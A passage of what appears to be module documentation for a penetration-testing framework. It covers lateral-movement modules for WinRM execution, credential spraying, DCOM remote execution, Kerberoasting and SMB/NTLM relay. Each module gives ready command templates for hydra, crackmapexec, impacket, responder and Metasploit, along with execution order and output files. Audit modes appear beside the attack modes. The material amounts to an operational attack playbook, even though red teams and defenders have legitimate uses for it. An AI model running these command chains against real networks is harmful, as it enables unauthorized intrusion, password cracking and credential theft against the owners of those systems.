        1. `evil-winrm -i <target> -u <user> -p <pass> -e "<command>"` (Core Execution)
        2. `crackmapexec winrm <target> -u <user> -p <pass> -X "<command>"` (Alternative Execution)
        3. `nmap -sV -p 5985 <target>` (Service Fingerprint)
        4. `smbclient -c "<command>" // <target>/C$ -U <user>%<pass>` (SMB Fallback)
        5. `rpcclient -U <user>%<pass> <target> -c "sysinfo"` (System Context)
    - **Execution Flow**: Core Execution -> Alternative -> Fingerprint -> Fallback -> System Context.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXEC_[Timestamp]_winrm_command_output.txt`: Results from high-speed command execution via WinRM.
        - `reports/artifacts/EXEC_[Timestamp]_winrm_fingerprint.xml`: Nmap service fingerprint for WinRM.
        - `reports/analysis/EXEC_[Timestamp]_system_context.json`: Comprehensive report on the remote system context.

---

### 13. Credential Spray
**ID:** `lat-credspray` | **Risk:** HIGH | **File:** `CredentialSprayModule.java`
**Tools:** `hydra`, `nmap`, `ncrack`, `netcat`, `crackmapexec`

#### Execution Modes:

- **`SPRY`** (Short Name: `SPRY`)
    - **Purpose**: Perform multi-target credential spraying to identify weak or shared passwords.
    - **Input Schema**: `{ targets: Path, userlist: Path, pass: Password }`
    - **Multi-Tool Command Logic**:
        1. `hydra -L <userlist> -p <pass> -M <targets> smb` (Core SMB Spray)
        2. `crackmapexec smb <targets> -u <userlist> -p <pass>` (CME Audit)
        3. `ncrack -U <userlist> -p <pass> <targets>` (Ncrack Backup)
        4. `nmap -p 445 --script smb-enum-users <targets>` (Target Discovery)
        5. `nc -zv <targets> 445` (Port Probe)
    - **Execution Flow**: Discovery -> Port Probe -> SMB Spray -> CME Audit -> Ncrack Backup.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SPRAY_[Timestamp]_success_creds.json`: Successfully identified valid credentials across targets.
        - `reports/artifacts/SPRAY_[Timestamp]_cme_telemetry.log`: Detailed telemetry from the CrackMapExec audit.
        - `reports/analysis/SPRAY_[Timestamp]_target_status.json`: Verification of target availability and port status.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify credential spraying susceptibility and target configuration.
    - **Input Schema**: `{ targets: Path }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445,3389 -iL <targets>` (Port Probe)
        2. `crackmapexec smb <targets> --gen-relay-list relay.txt` (Target Discovery)
        3. `hydra -h` (Binary Check)
        4. `ncrack -V` (Binary Check)
        5. `nc -zv <targets> 445` (Connectivity Check)
    - **Execution Flow**: Port Probe -> Target Discovery -> Binary Check x2 -> Connectivity Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_spray_vulnerability.json`: Status of credential spraying vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_spray_context.json`: Targeting settings and environment context.

---

### 14. DCOM Command
**ID:** `lat-dcom` | **Risk:** HIGH | **File:** `DCOMModule.java`
**Tools:** `impacket`, `nmap`, `rpcclient`, `msfconsole`, `netcat`

#### Execution Modes:

- **`EXEC`** (Short Name: `EXEC`)
    - **Purpose**: Execute remote commands via DCOM object instantiation.
    - **Input Schema**: `{ target: String, user: String, pass: Password, command: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-dcomexec <domain>/<user>:<pass>@<target> "<command>"` (Core DCOM Exec)
        2. `nmap -p 135 --script dcom-enum <target>` (DCOM Enumeration)
        3. `rpcclient -U "<user>%<pass>" -c "srvinfo" <target>` (RPC Context)
        4. `msfconsole -x "use exploit/windows/smb/psexec; set WMI true; run"` (Alternative WMI)
        5. `nc -zv <target> 135` (Port Probe)
    - **Execution Flow**: Discovery -> Port Probe -> DCOM Exec -> RPC Context -> Alternative WMI.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXEC_[Timestamp]_dcom_output.txt`: Captured output of the remotely executed command.
        - `reports/artifacts/EXEC_[Timestamp]_dcom_telemetry.json`: Technical telemetry from the DCOM object instantiation.
        - `reports/analysis/EXEC_[Timestamp]_rpc_audit.json`: Audit of RPC and DCOM service status.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify DCOM susceptibility and target configuration.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 135 --script dcom-enum <target>` (DCOM Enumeration)
        2. `rpcclient -U "" -N <target>` (Null Session Check)
        3. `crackmapexec smb <target> --gen-relay-list relay.txt` (Target Discovery)
        4. `impacket-rpcdump <target>` (RPC Dump)
        5. `nc -zv <target> 135` (Port Probe)
    - **Execution Flow**: DCOM Enumeration -> Null Check -> Target Discovery -> RPC Dump -> Port Probe.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_dcom_vulnerability.json`: Status of DCOM relay vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_dcom_context.json`: DCOM settings and environment context.

---

### 15. Kerberoasting Attack
**ID:** `lat-kerberoast` | **Risk:** MEDIUM | **File:** `KerberoastingModule.java`
**Tools:** `impacket`, `hashcat`, `john`, `ldapsearch`, `nmap`

#### Execution Modes:

- **`ROST`** (Short Name: `ROST`)
    - **Purpose**: Extract Kerberos TGS tickets for offline cracking.
    - **Input Schema**: `{ target: String, user: String, pass: Password, domain: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-GetUserSPNs -request -dc-ip <target> <domain>/<user>:<pass>` (Core Roasting)
        2. `ldapsearch -h <target> -x -D "<user>@<domain>" -w "<pass>" -b "dc=...,dc=..." "(servicePrincipalName=*)"` (LDAP Discovery)
        3. `nmap -p 88 <target>` (KDC Port Probe)
        4. `hashcat -m 13100 --help` (Binary Check)
        5. `john --version` (Binary Check)
    - **Execution Flow**: Discovery -> Port Probe -> Roasting -> LDAP Discovery -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ROAST_[Timestamp]_tgs_hashes.txt`: Extracted TGS-REP hashes for offline cracking.
        - `reports/artifacts/ROAST_[Timestamp]_spn_inventory.json`: Inventory of discovered SPNs and service accounts.
        - `reports/analysis/ROAST_[Timestamp]_kdc_status.json`: Verification of KDC availability and port status.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify Kerberoasting susceptibility and target configuration.
    - **Input Schema**: `{ domain: String, target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 88 <target>` (KDC Port Probe)
        2. `crackmapexec smb <target> --gen-relay-list relay.txt` (Target Discovery)
        3. `ldapsearch -h <target> -x -s base` (LDAP Check)
        4. `impacket-GetUserSPNs -h` (Binary Check)
        5. `hashcat -m 13100 --help` (Binary Check)
    - **Execution Flow**: Port Probe -> Target Discovery -> LDAP Check -> Binary Check x2.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_roast_vulnerability.json`: Status of Kerberoasting vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_roast_context.json`: Targeting settings and environment context.

---

### 16. SMB Relay
**ID:** `lat-smbrelay` | **Risk:** CRITICAL | **File:** `SMBRelayModule.java`
**Tools:** `impacket`, `nmap`, `responder`, `netcat`, `msfconsole`

#### Execution Modes:

- **`RELY`** (Short Name: `RELY`)
    - **Purpose**: Relay NTLM authentication to target systems for remote execution.
    - **Input Schema**: `{ targets: Path, command: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-ntlmrelayx -tf <targets> -c "<command>"` (Core SMB Relay)
        2. `responder -I eth0 -r -d -v` (Poisoning Engine)
        3. `nmap -p 445 --script smb-security-mode <targets>` (Signing Audit)
        4. `msfconsole -x "use exploit/windows/smb/smb_relay; set RHOSTS <targets>; run"` (Metasploit Alternative)
        5. `nc -zv <targets> 445` (Port Probe)
    - **Execution Flow**: Signing Audit -> Port Probe -> Poisoning -> SMB Relay -> Metasploit Alternative.
    - **Output Generation & Artifacts**:
        - `reports/outputs/RELAY_[Timestamp]_relay_success.json`: Log of successful authentication relays and command output.
        - `reports/artifacts/RELAY_[Timestamp]_responder_log.txt`: Detailed log from the Responder poisoning engine.
        - `reports/analysis/RELAY_[Timestamp]_signing_audit.json`: Audit of SMB signing status across target systems.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify SMB relaying susceptibility and target configuration.
    - **Input Schema**: `{ targets: Path }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 --script smb-security-mode -iL <targets>` (SMB Signing Audit)
        2. `crackmapexec smb <targets> --gen-relay-list relay.txt` (Target Discovery)
        3. `responder --help` (Binary Check)
        4. `impacket-ntlmrelayx -h` (Binary Check)
        5. `nc -zv <targets> 445` (Connectivity Check)
    - **Execution Flow**: SMB Signing -> Target Discovery -> Binary Check x2 -> Connectivity Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_smb_vulnerability.json`: Status of SMB relay vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_smb_context.json`: SMB signing settings and environment context.

---

**© 2026 Funbinet Inc. — JABBER V 5.5.0.0**
